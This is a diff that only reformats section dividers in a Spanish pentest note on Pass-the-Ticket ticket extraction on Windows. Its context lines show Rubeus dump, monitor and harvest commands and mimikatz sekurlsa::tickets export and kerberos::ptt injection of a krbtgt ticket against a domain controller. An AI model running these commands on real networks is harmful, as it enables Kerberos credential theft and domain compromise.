@@ -17,7 +17,7 @@ linked:
 ---
 # Pass-the-Ticket - Windows Extraction
 
-***
+---
 
 ## Rubeus dump (one-shot)
 
@@ -44,7 +44,7 @@ linked:
 
 Requiere `SeDebugPrivilege` (admin local) para leer tickets de otras sesiones.
 
-___
+---
 
 ## Rubeus monitor (captura continua)
 
@@ -65,7 +65,7 @@ ___
 dir \\dc01\c$  # Verificar acceso
 ```
 
-___
+---
 
 ## Rubeus harvest (TGT renewal)
 
@@ -80,7 +80,7 @@ ___
 # Output: new/renewed TGT cada 30 seg hasta expirar
 ```
 
-___
+---
 
 ## mimikatz sekurlsa::tickets (listar)
 
@@ -96,7 +96,7 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets
 ```
 
-___
+---
 
 ## mimikatz sekurlsa::tickets /export
 
@@ -115,7 +115,7 @@ mimikatz # kerberos::ptt [0;3e7]-0-0-40e10000-admin@krbtgt-CORP.LOCAL.kirbi
 klist
 ```
 
-___
+---
 
 ## LUID targeting
 
@@ -136,4 +136,4 @@ ___
 .\Rubeus.exe dump /luid:0x462d4 /service:krbtgt /nowrap
 ```
 
-***
+---
